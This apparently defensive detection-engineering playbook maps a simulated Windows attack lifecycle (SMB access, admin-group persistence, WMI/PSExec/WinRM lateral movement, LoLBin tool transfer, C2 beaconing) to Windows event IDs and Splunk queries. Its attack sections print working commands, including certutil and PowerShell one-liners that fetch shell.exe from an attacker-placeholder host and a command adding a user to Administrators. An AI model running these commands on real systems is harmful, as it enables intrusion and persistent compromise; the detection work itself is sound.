# 🛡️ Detection Engineering & Threat Hunting  
## 🔐 The Ultimate Windows Attack Lifecycle Master Playbook

![Platform](https://img.shields.io/badge/Platform-Windows-orange)
![SIEM](https://img.shields.io/badge/SIEM-Splunk-green)
![Telemetry](https://img.shields.io/badge/Telemetry-Sysmon-blue)
![Techniques](https://img.shields.io/badge/Techniques-Impacket%20%7C%20Metasploit%20%7C%20WinRM-red)
![Status](https://img.shields.io/badge/Detection-Operational-success)

---

## 📌 Executive Overview

This report documents a **forensic-level simulation of a modern Windows attack lifecycle**.

By bridging the gap between:

⚔️ **Offensive Exploitation Techniques**
- Impacket  
- Metasploit  
- Evil-WinRM  

🛡️ **Defensive SIEM Analysis**
- Splunk  
- Sysmon  
- Windows Security Logs  

We developed a **robust, multi-layered detection framework** capable of detecting adversaries across the full compromise lifecycle.

---

## 🧪 Full Attack Lifecycle Map
```
🔎 Recon → 🔑 Initial Access → 🧩 Persistence
↓
⬆ Privilege Escalation → 🔄 Lateral Movement
↓
📥 Tool Transfer → 🌐 C2 Beaconing
↓
👑 Privilege Token Abuse

```

---

## ⚔️ Phase 1: Reconnaissance & Initial Access (SMB)

Attackers frequently begin by **mapping the network and validating credentials** against exposed services.

---

## 💻 Attack Logic

Tool Used:

```
Impacket-SMBClient
```

Command:

```bash
impacket-smbclient <user>:<password>@<Target_IP>
```
Protocol:
```
Server Message Block (SMB)
```

---
## 🔍 Detection Signatures

🪪 Event ID 4624 — Successful Network Logon
```
Logon Type 3 → Network Logon
```
- ✔ Remote authentication
- ✔ Credential validation

❌ Event ID 4625 — Failed Logon

High-frequency failures indicate:

- ⚠ Password spraying
- ⚠ Brute-force attempts

---
## ⚔️ Phase 2: Persistence & Privilege Escalation

Attackers ensure long-term access by modifying administrative privileges.

💻 Attack Logic

Command:
```cmd
net localgroup administrators <username> /add
```
Executed via:
```
Impacket-PSExec (SYSTEM privileges)
```
Goal:

- ✔ Persistent administrator-level access

---
## 🔍 Detection Signatures

|🆔 Event ID	|📄 Description |
|-------------|---------------|
|4720	|👤 User account created |
|4732	|🛡️ Added to Administrators group |

🚨 High-Fidelity Alert

Monitor execution of:
```
net.exe
net1.exe
```
Target:
```
Administrators group
```
- ⚠ Any modification should trigger immediate SOC investigation.

---
## ⚔️ Phase 3: Lateral Movement & Remote Execution

🔥 The Big Three: WMI, PSExec, WinRM

Once credentials are compromised, attackers move laterally using built-in administrative protocols.

---
## 💻 Attack Logic
🧰 WMIExec

Uses:
```
Windows Management Instrumentation (DCOM)
```
- ✔ Fileless execution
- ✔ Low disk artifacts

🛠 PSExec

Creates:
```
Temporary SYSTEM-level service over SMB
```
🧠 Evil-WinRM

Uses:
```
Windows Remote Management
Ports: 5985 / 5986
```
Creates:

- ✔ Interactive PowerShell sessions
- ✔ Remote administrative shell

---
## 🔍 Detection Signatures
```
Parent → Child Process Tracking (Event ID 4688)
```
🔗 WMI Signature
```
wmiprvse.exe → cmd.exe
wmiprvse.exe → powershell.exe
```
🔗 PSExec Signature
```
services.exe → PSEXESVC.exe
```
Or:
```
services.exe → random_service_binary.exe
```
💎 WinRM Signature
```
wsmprovhost.exe → cmd.exe
wsmprovhost.exe → powershell.exe
```
Strong indicator of:

- ✔ Remote shell execution

---
## ⚔️ Phase 4: Ingress Tool Transfer (LoLBins)

Attackers download payloads using trusted Windows binaries.

💻 Attack Logic

Payload:
```
shell.exe
```
Hosted using:
```
python3 -m http.server 80
```

## 📥 Download Methods

🧾 Certutil
```bash
certutil.exe -urlcache -split -f http://<Attacker_IP>/shell.exe shell.exe
```
⚡ PowerShell
```powershell
powershell iwr -uri http://<Attacker_IP>/shell.exe -outfile shell.exe
```

---
## 🔍 Detection Signatures

Monitor:
```
certutil.exe -urlcache
```
And:
```
Invoke-WebRequest
iwr
```

---
## ⚔️ Phase 5: Command & Control (C2)

🌐 Beaconing & Repeated Connections

Mature SOC environments detect repeated communication patterns, not just single connections.

💻 Attack Logic

Binary:
```
shell.exe
```
Behavior:

- ✔ Reverse TCP connection
- ✔ Periodic beaconing
- ✔ Persistent attacker communication

---
## 🔍 Detection Signature — Frequency Analysis
📡 Sysmon Event ID 3 — Network Connection

Monitor:
```
Image: C:\Users\...\shell.exe
DestinationIp: <Attacker_External_IP>
```
🔁 Repeated Connection Logic

Use aggregation:
```spl
index=* EventCode=3

| stats count by SourceIp, DestinationIp

| where count > 10

```
Detection indicator:

- ⚠ High number of outbound connections
- ⚠ Same destination IP
- ⚠ Non-browser binary

➡ Strong indicator of C2 Beaconing

---
## ⚔️ Phase 6: Privilege Token Analysis ("God-Mode")

The highest-value detection layer.

📂 Sensitive Privileges to Monitor

Event Sources:
```
Event ID 4672
Event ID 4673
```

---
## 🚨 Critical Privileges

|🔑 Privilege |	⚠ Risk |
|-------------|-----------|
|SeDebugPrivilege	|Memory access (Credential dumping) |
|SeTakeOwnershipPrivilege	|Object takeover |
|SeTcbPrivilege	|OS-level privilege |

Strong indicators of:

- ✔ SYSTEM compromise
- ✔ Credential theft

---
## 📊 Universal Splunk Detection Logic

🧠 Unified Attack Timeline
```spl
index=* (EventCode IN (4688, 1, 4672, 4732, 3, 4624))

| eval User = coalesce(Account_Name, user, TargetUserName)

| eval Process = coalesce(New_Process_Name,
                          Image,
                          process_name)

| eval Parent = coalesce(Creator_Process_Name,
                         ParentImage,
                         ParentProcessName)

| eval Remote_IP = coalesce(DestinationIp,
                            Source_Network_Address,
                            ip)

| eval Activity = case(
    EventCode==4624, "🔑 Network Logon",
    EventCode==4732, "🛡️ Admin Group Modification",
    match(Parent, "(?i)wsmprovhost\\.exe"), "💎 Suspicious WinRM Execution",
    match(Parent, "(?i)wmiprvse\\.exe"), "🧰 Suspicious WMI Execution",
    EventCode==4688 OR EventCode==1, "⚙ Process Creation",
    EventCode==3, "🌐 External Network Callout / Beacon",
    EventCode==4672, "👑 God-Mode Privilege Assigned"
)

| table _time,
         Activity,
         User,
         Process,
         Parent,
         Remote_IP,
         Privileges

| sort - _time

```

---
## 🏆 Final Architecture Summary

|⚔ Attack Phase	|🆔 Event ID	|🔍 Detection Signal	|🛡 Defense Layer |
|---------------|-------------|---------------------|-----------------|
|🔑 Initial Access	|4624	|Logon Type 3	|Identity Monitoring |
|🧩 Persistence	|4732	|Admin Group |Change	Host Configuration |
|🔄 Lateral Movement	|4688	|wsmprovhost | wmiprvse → cmd.exe	|Process Monitoring |
|📥 Tool Transfer	|4688	|certutil -urlcache	|Application Control |
|🌐 C2 Beaconing	|Sysmon 3	|Repeated outbound TCP	|Network Telemetry |
|👑 Privilege Escalation	|4672	|SeDebugPrivilege	|Behavioral Analytics |

---
## 🧠 Key Takeaway

🛡️ Real attackers generate behavior chains, not isolated alerts.

Effective detection requires:

- ✔ Event correlation
- ✔ Timeline reconstruction
- ✔ Process lineage
- ✔ Network frequency analysis

---
## 🚀 Future Expansion Roadmap

Next planned detection modules:

- 🧠 Credential Dumping Detection (Mimikatz)
- 🧬 LSASS Memory Access Monitoring
- 📅 Scheduled Task Persistence
- 📤 Data Exfiltration Detection
- 🌐 DNS Tunneling Detection

---
## ✍️ Author

Abhay

🔐 Detection Engineer
🧠 Threat Hunter
📊 SIEM Specialist

---
